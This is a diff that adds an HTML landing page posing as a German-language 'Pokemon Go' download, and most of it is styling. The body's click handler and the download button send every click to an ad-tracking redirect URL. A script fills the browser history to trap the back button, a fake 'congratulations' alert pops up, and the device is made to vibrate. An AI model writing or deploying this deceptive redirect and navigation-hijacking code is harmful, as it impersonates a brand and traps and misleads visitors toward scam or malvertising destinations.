@@ -1,0 +1,566 @@
+ <!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Pokemon Go</title>
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
+    <style>
+        html,
+        body { height: 100%; }
+
+        body {
+            position: relative;
+            font-family: "Roboto Condensed", "Lato", "Arial", sans-serif;
+        }
+
+        ul { padding: 0; }
+        li { list-style: none; }
+        p { margin: 0; }
+        .rel { position: relative; }
+
+        .pt15 { padding-top: 15px; }
+        input { outline: none; }
+        .row {
+            margin-left: 0;
+            margin-right: 0;
+        }
+
+        h1, h2, h3, h4, h5, h6, p { padding: 0; margin: 0; }
+
+        .bold-text {
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        a, button {
+            -webkit-transition: background-color 0.3s ease-in;
+            -moz-transition: background-color 0.3s ease-in;
+            -ms-transition: background-color 0.3s ease-in;
+            transition: background-color 0.3s ease-in;
+        }
+
+        input {
+            -webkit-transition: border, box-shadow 0.2s ease-in;
+            -moz-transition: border, box-shadow 0.2s ease-in;
+            -ms-transition: border, box-shadow 0.2s ease-in;
+            transition: border, box-shadow 0.2s ease-in;
+        }
+
+        button { outline: none !important; }
+
+        a {
+            border: none !important;
+            outline: none !important;
+        }
+
+       
+
+        #wrap:before {
+            height: 302px;
+            top: -28px;
+            background: -webkit-linear-gradient(top, rgb(4, 218, 190) 0%, rgba(155, 255, 123, 0.43) 55%, rgba(155, 255, 123, 0) 100%);
+            background: -moz-linear-gradient(top, rgb(4, 218, 190) 0%, rgba(155, 255, 123, 0.43) 55%, rgba(155, 255, 123, 0) 100%);
+            background: -ms-linear-gradient(top, rgb(4, 218, 190) 0%, rgba(155, 255, 123, 0.43) 55%, rgba(155, 255, 123, 0) 100%);
+            background: linear-gradient(to bottom, rgb(4, 218, 190) 0%, rgba(155, 255, 123, 0.43) 55%, rgba(155, 255, 123, 0) 100%);
+            z-index: 1;
+        }
+
+        #wrap:before, #wrap:after {
+            content: '';
+            display: block;
+            width: 100%;
+            z-index: 0;
+            position: absolute;
+            left: 0;
+            opacity: 0.73;
+        }
+
+        /*** Main btn start ***/
+        .btn-next {
+            -webkit-transition: background 0.2s ease;
+            -moz-transition: background 0.2s ease;
+            -ms-transition: background 0.2s ease;
+            transition: background 0.2s ease;
+        }
+
+        .btn-next:before { z-index: 3; }
+
+        .btn-next:before {
+            -webkit-animation-name: pulse;
+            -moz-animation-name: pulse;
+            -ms-animation-name: pulse;
+            animation-name: pulse;
+            -webkit-animation-duration: 0.9s;
+            -moz-animation-duration: 0.9s;
+            -ms-animation-duration: 0.9s;
+            animation-duration: 0.9s;
+            -webkit-animation-timing-function: linear;
+            -moz-animation-timing-function: linear;
+            -ms-animation-timing-function: linear;
+            animation-timing-function: linear;
+            -webkit-animation-iteration-count: infinite;
+            -moz-animation-iteration-count: infinite;
+            -ms-animation-iteration-count: infinite;
+            animation-iteration-count: infinite;
+        }
+
+        .btn {
+            cursor:pointer;
+            display: block;
+
+            border-radius: 20px;
+            position: relative;
+            font-family: "Roboto Condensed", sans-serif;
+            font-weight: 700;
+            font-size: 16px;
+            line-height: 1;
+            text-transform: uppercase;
+            background: rgb(0, 172, 238);
+            background: -webkit-linear-gradient(left, rgb(0, 172, 238) 4%, rgb(0, 135, 230) 33%, rgb(0, 209, 246) 93%);
+            background: -moz-linear-gradient(left, rgb(0, 172, 238) 4%, rgb(0, 135, 230) 33%, rgb(0, 209, 246) 93%);
+            background: -ms-linear-gradient(left, rgb(0, 172, 238) 4%, rgb(0, 135, 230) 33%, rgb(0, 209, 246) 93%);
+            background: linear-gradient(to right, rgb(0, 172, 238) 4%, rgb(0, 135, 230) 33%, rgb(0, 209, 246) 93%);
+            padding: 8px 54px 8px 18px;
+            border: 2px rgb(255, 255, 255) solid;
+            text-align: center;
+            white-space: nowrap;
+            color: rgb(255, 255, 255);
+            text-decoration: none;
+            -webkit-transition: all 0.4s ease-out;
+            -moz-transition: all 0.4s ease-out;
+            -ms-transition: all 0.4s ease-out;
+            transition: all 0.4s ease-out;
+        }
+
+        .btn:hover {
+            color: rgb(255, 200, 0);
+            text-shadow: 1px 1px 0 rgba(0, 0, 0, 0.5);
+        }
+
+        .btn-play {
+            position: relative;
+            font-size: 25px;
+            background: rgb(16, 218, 248);
+            background: -webkit-linear-gradient(left, rgb(16, 218, 248) 0%, rgb(0, 133, 230) 100%);
+            background: -moz-linear-gradient(left, rgb(16, 218, 248) 0%, rgb(0, 133, 230) 100%);
+            background: linear-gradient(to right, rgb(16, 218, 248) 0%, rgb(0, 133, 230) 100%);
+            margin: 25px 0 15px 0;
+            -webkit-transform-origin: 0 50%;
+            -ms-transform-origin: 0 50%;
+            transform-origin: 0 50%;
+            border-radius: 14px;
+            border: 2px solid #fff !important;
+        }
+
+        #step1 .btn-play { padding: 13px 25px 13px 63px; }
+        #step2 .btn-play { padding: 13px 25px; }
+
+        .btn-play button { display: none; }
+
+        #step1 .btn-play:before {
+            content: '';
+            position: absolute;
+            left: -44px;
+            top: -13px;
+            width: 95px;
+            height: 87px;
+            overflow: hidden;
+            background-color: rgba(0, 0, 0, 0);
+            background-image: url("img/sprite.png");
+            background-repeat: no-repeat;
+            background-position: 0 0;
+            background-size: 414px auto;
+            display: inline-block;
+        }
+
+        .btn.active, .btn:active {
+            background: rgb(16, 218, 248);
+            background: -webkit-linear-gradient(left, rgb(16, 218, 248) 0%, rgb(0, 133, 230) 100%);
+            background: -moz-linear-gradient(left, rgb(16, 218, 248) 0%, rgb(0, 133, 230) 100%);
+            background: -ms-linear-gradient(left, rgb(16, 218, 248) 0%, rgb(0, 133, 230) 100%);
+            background: linear-gradient(to right, rgb(16, 218, 248) 0%, rgb(0, 133, 230) 100%);
+        }
+
+        .btn-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            border-radius: 14px;
+            -webkit-transition: opacity 0.2s ease;
+            -moz-transition: opacity 0.2s ease;
+            -ms-transition: opacity 0.2s ease;
+            transition: opacity 0.2s ease;
+        }
+
+        #step2 {
+            margin-top: 25px;
+        }
+
+        .phone-field {
+            width: 70%;
+            padding: 8px 10px;
+            border-radius: 10px;
+            font-size: 20px;
+            border: 2px solid #049BEB;
+            background: #fff;
+            text-align: center;
+        }
+        /*** Main btn end ***/
+
+        /*** Phone start ***/
+        .phone-display { text-align: center; }
+        .phone-display-carousel {
+            position: relative;
+            display: inline-block;
+            margin-bottom: -44px;
+        }
+
+        .phone-display-image {
+            width: 190px;
+            height: 330px;
+            margin-bottom: -44px;
+        }
+
+        .phone-display-carousel-mask {
+            width: 146px;
+            height: 260px;
+            background: rgb(0, 0, 0);
+            overflow: hidden;
+            position: absolute;
+            left: 22px;
+            top: 32px;
+        }
+
+        .phone-display-carousel-list {
+            width: 146px;
+            height: 260px;
+            background: rgb(0, 0, 0);
+            padding: 0;
+            margin: 0;
+            position: relative;
+        }
+
+
+        .phone-display-carousel-list li {
+            position: absolute;
+            left: 100%;
+            top: 0;
+            width: 146px;
+            height: 260px;
+            margin: 0;
+            padding: 0;
+            -webkit-transition: left 0.5s ease-in;
+            -moz-transition: left 0.5s ease-in;
+            -ms-transition: left 0.5s ease-in;
+            transition: left 0.5s ease-in;
+        }
+
+        .phone-display-carousel-list li img {
+            display: block;
+            width: 100%;
+            height: auto;
+        }
+
+        .phone-display-carousel-list li.active {
+            top: 0;
+            left: 0;
+        }
+
+        /****/
+
+        .phone-display-bezel {
+            font-size: 0;
+            border-radius: 100% 100% 12px 12px / 50% 50% 12px 12px;
+            margin: 0 15px;
+            padding: 44px 12px 30px 12px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            color: #fff;
+            text-transform: uppercase;
+            margin-top: 45px;
+            background: -webkit-linear-gradient(top, rgba(255, 255, 255, 0.5) 0%, rgba(255, 255, 255, 0.4) 100%);
+            background: -moz-linear-gradient(top, rgba(255, 255, 255, 0.5) 0%, rgba(255, 255, 255, 0.4) 100%);
+            background: -ms-linear-gradient(top, rgba(255, 255, 255, 0.5) 0%, rgba(255, 255, 255, 0.4) 100%);
+            background: linear-gradient(to bottom, rgba(255, 255, 255, 0.5) 0%, rgba(255, 255, 255, 0.4) 100%);
+        }
+
+        .phone-display h3 {
+            font-size: 32px;
+            font-weight: 900;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.4);
+            margin: 0;
+            text-align: center;
+            font-family: "Lato";
+        }
+        /*** Phone end ***/
+
+        .left-section {
+            padding-top: 110px;
+            text-align: center;
+        }
+
+        .right-section {
+            padding-top: 145px;
+            text-align: right;
+        }
+
+        #step3 {
+            display: block;
+            position: absolute;
+            width: 30%;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 30px 23px;
+            left: 0;
+            right: 0;
+            border-radius: 8px;
+            top: 25%;
+            z-index: 100;
+            text-align: center;
+            line-height: 1.5;
+            font-size: 25px;
+            font-family: "Lato";
+            background: #fff;
+            box-shadow: 0 0 9px 0 rgba(0,0,0,0.5);
+        }
+        .text-ok {
+            font-size: 30px;
+            color: #049BEB;
+        }
+
+        .blur {
+            -webkit-filter: blur(2px);
+            -moz-filter: blur(2px);
+            filter: blur(2px);
+        }
+
+        .no-select {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+
+
+
+        @media (max-height: 832px) {
+            .get-up-text {
+                font-size: 85px;
+                padding-top: 35px;
+            }
+
+            .main-section { margin-bottom: 10px; }
+        }
+
+        @media (max-width: 1390px) {
+            #step3 {
+                width: 40%;
+                top: 30%;
+            }
+        }
+
+        @media (max-width: 1199px) {
+            .get-up-text { font-size: 85px; }
+
+            #step3 {
+                width: 50%;
+            }
+        }
+
+        @media (max-width: 991px) {
+            .get-up-text { font-size: 70px; }
+            .phone-display {
+                text-align: right;
+            }
+            .phone-display-bezel {
+                width: 100%;
+                margin: 50px 28px 0 28px;
+                padding: 50px 12px 25px 12px;
+            }
+
+            .phone-display h3 { font-size: 22px; }
+
+            #step1 .btn-play {
+                width: 90%;
+                margin-left: 5%;
+                margin-right: 5%;
+            }
+
+            .phone-field { width: 100%; }
+
+            #step2 .btn-play {
+                width: 100%;
+                margin-left: auto;
+            }
+
+            #step3 {
+                width: 60%;
+                top: 33%;
+            }
+        }
+
+        @media (min-width: 768px){
+            .navbar-right { margin-right: 0; }
+        }
+
+
+        @media (max-width: 767px) {
+
+            .main-section { padding: 45px 0 30px 0; }
+            .main-section.step3 { min-height: 645px; }
+
+            .header-logo a img {
+                width: 80%;
+                margin-left: 10%;
+            }
+
+            .right-section { padding-top: 0; }
+
+            .left-section { padding: 70px 0 0 0; }
+
+            .get-up-text {
+                font-size: 40px;
+                padding-top: 10px;
+            }
+
+            #step1 .btn-play {
+                width: 100%;
+                margin-left: 15px;
+                margin-right: 0;
+                font-size: 23px;
+                padding: 13px 25px 13px 54px;
+            }
+
+            #step2 .btn-play { margin-top: 15px; }
+
+            #step3 {
+                width: 94%;
+                top: 26%;
+                padding: 20px 15px;
+                font-size: 22px;
+            }
+
+            .phone-display {
+                text-align: center;
+            }
+
+            .box-dark {
+                font-size: 15px;
+                text-align: center;
+                padding: 5px 15px;
+            }
+
+            .subscribe-text {
+                padding-right: 115px;
+                margin: 5px 0;
+                font-size: 19px;
+            }
+
+            .text-ok { font-size: 27px; }
+
+            .navbar-nav > li > a {
+                padding-top: 0;
+                text-align: center;
+            }
+
+            .right-section { display: none; }
+
+            .step3 .right-section { display: block; }
+        }
+
+        /***********************************************************/
+        /*#************************ Old Browsers *******************/
+        /***********************************************************/
+        .oldie .old-browser-message {
+            display: block;
+            position: fixed;
+            background: gray;
+            width: 100%;
+            height: 100%;
+            z-index: 1000;
+            font-size: 4em;
+            color: white;
+            text-align: center;
+        }
+
+        .oldie body { overflow: hidden; }
+        .old-browser-message { display: none;}
+        .oldie .old-browser-message { display: block; }
+
+
+        .appstore {
+            margin-top:20px;
+        }
+    </style>
+    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+    <style>
+        body {
+            background: url(img/bg.png) no-repeat #0C55A7;
+            padding:0px !important;
+            background-size: cover;
+        }
+        .logo {
+            max-height: 150px;
+            margin-bottom: 20px;
+        }
+        .responsive {
+            max-width: 100%;
+        }
+        .frame {
+            max-width: 600px;
+            margin: 0px auto;
+            text-align: center;
+        }
+    </style>
+    <script>function red(url){window.location = url;}</script>
+    </head>
+<body class="pc" onclick="red('https://yefr9.bemobtrk.com/click');">
+<div class="frame">
+    <img src="img//pokemon_go_logo.png" class="logo responsive">
+    <div id="carousel-example-generic" class="carousel slide" data-ride="carousel">
+        <div class="phone-display">
+            <div class="phone-display-carousel">
+                <img src="img/phone-screenshot.png" style="max-width:190px" class="phone-display-image">
+                <div class="phone-display-carousel-mask">
+                    <div class="carousel-inner">
+                        <ul class="phone-display-carousel-list">
+                            <li class="item active">
+                                <img  style="max-width:190px"  src="img/screen3.png">
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <br />
+        <div style="margin-top:25px;font-size:18px;color:white">
+            Laden Sie die neuesten Spiele auf den Markt herunter!         </div>
+        <a class="btn btn-play btn-next" href="https://yefr9.bemobtrk.com/click">
+            <div class="btn-overlay"></div>
+            Jetzt Downloaden        </a>
+    </div>
+</div>
+ <script>
+	!function () {
+	    var t;
+	    var tmp = window.location.href;
+	    try {
+	        for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+	        onpopstate = function (t) {
+	            t.state && location.replace(tmp);
+	        }
+	    } catch (o) {
+	    }
+	}();
+
+	</script><script>alert('Herzliche Glückwünsche');</script>
+		<script>
+		navigator.vibrate([1000, 300, 1000, 300,1000]);
+		</script>      
+
+      <!-- This landing page has been Generated using purelander.com --> 
+
+ 
+</body></html>
